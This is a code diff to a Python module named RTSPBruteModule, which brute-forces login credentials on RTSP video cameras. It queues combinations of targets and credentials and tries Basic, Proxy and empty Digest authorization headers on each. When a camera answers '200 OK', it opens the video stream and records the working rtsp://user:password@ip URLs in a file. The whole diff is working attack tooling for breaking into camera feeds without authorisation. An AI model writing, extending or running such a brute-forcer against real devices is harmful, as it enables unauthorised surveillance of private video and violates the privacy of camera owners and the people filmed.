@@ -8,6 +8,7 @@ import time
 import cv2
 from queue import Queue
 from common import cargar_datos, guardar_datos
+import os
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -41,7 +42,6 @@ class RTSPBruteModule:
 
         queue = Queue()
 
-        # Add all combinations of targets and credentials to the queue
         for target in self.targets:
             for credential in self.credentials:
                 queue.put((target, credential))
@@ -57,28 +57,38 @@ class RTSPBruteModule:
         passwToBytes = credential.encode('ascii')
         passwToB64 = base64.b64encode(passwToBytes)
         passwF = passwToB64.decode('ascii')
-        req = (
-            f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\n"
-            f"CSeq: 2\r\n"
-            f"Authorization: Basic {passwF}\r\n\r\n"
-        )
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(self.timeout)
-            s.connect((ip, int(port)))
-            encodereq = req.encode('ascii')
-            s.sendall(encodereq)
-            data = s.recv(1024)
-            response = data.decode('ascii')
-            s.close()
+        user, passwd = credential.split(':')
 
-            if "404 Not Found" not in response:
-                #logging.info(f"Found credentials for {ip}:{port} - {credential}")
-                url = f"rtsp://{credential}@{ip}:{port}/"
-                return self.display_camera(url)
-        except socket.error as e:
-            pass
-            #logging.error(f"Error connecting to {ip}:{port} - {e}")
+        auth_methods = [
+            f"Authorization: Basic {passwF}\r\n",
+            f"Proxy-Authorization: Basic {passwF}\r\n",
+            f"Authorization: Digest username=\"{user}\", realm=\"\", nonce=\"\", uri=\"rtsp://{ip}:{port}/\", response=\"\"\r\n",
+            f"Proxy-Authorization: Digest username=\"{user}\", realm=\"\", nonce=\"\", uri=\"rtsp://{ip}:{port}/\", response=\"\"\r\n",
+        ]
+
+        for auth in auth_methods:
+            req = (
+                f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\n"
+                f"CSeq: 2\r\n"
+                f"{auth}\r\n"
+            )
+
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(self.timeout)
+                s.connect((ip, int(port)))
+                encodereq = req.encode('ascii')
+                s.sendall(encodereq)
+                data = s.recv(1024)
+                response = data.decode('ascii')
+                s.close()
+
+                if "200 OK" in response:
+                    url = f"rtsp://{credential}@{ip}:{port}/"
+                    return self.display_camera(url)
+            except socket.error as e:
+                continue
+
         return False
 
     def display_camera(self, url):
@@ -97,20 +107,38 @@ class RTSPBruteModule:
             self.save_url(url)  # Save the URL only if the stream is successfully displayed
             return True
         else:
-            pass
-            #logging.error(f"Failed to open video stream from {url}")
+            logging.error(f"Failed to open video stream from {url}")
         return False
 
     def save_url(self, url):
+        ip = url.split('@')[1].split(':')[0]
+        if not os.path.exists("RTSPCONECT.txt"):
+            open("RTSPCONECT.txt", 'w').close()
+
+        with open("RTSPCONECT.txt", "r") as file:
+            lines = file.readlines()
+
+        # Eliminar duplicados
+        new_lines = []
+        seen_ips = set()
+        for line in lines:
+            saved_ip = line.split('@')[1].split(':')[0]
+            if saved_ip not in seen_ips:
+                seen_ips.add(saved_ip)
+                new_lines.append(line)
+        
+        # Agregar nuevo URL si la IP no existe
+        if ip not in seen_ips:
+            new_lines.append(url + '\n')
+        
+        with open("RTSPCONECT.txt", "w") as file:
+            file.writelines(new_lines)
+        
         self.seen_urls.add(url)
-        with open("RTSPCONECT.txt", "a") as file:
-            file.write(f"{url}\n")
 
     def brute_force(self, task):
         target, credential = task
         ip, port = target
         if not self.rtsp_request(target, credential):
-            pass
-            #logging.info(f"Failed login for {ip}:{port} with {credential}")
+            logging.info(f"Failed login for {ip}:{port} with {credential}")
         time.sleep(self.pause_duration)
-
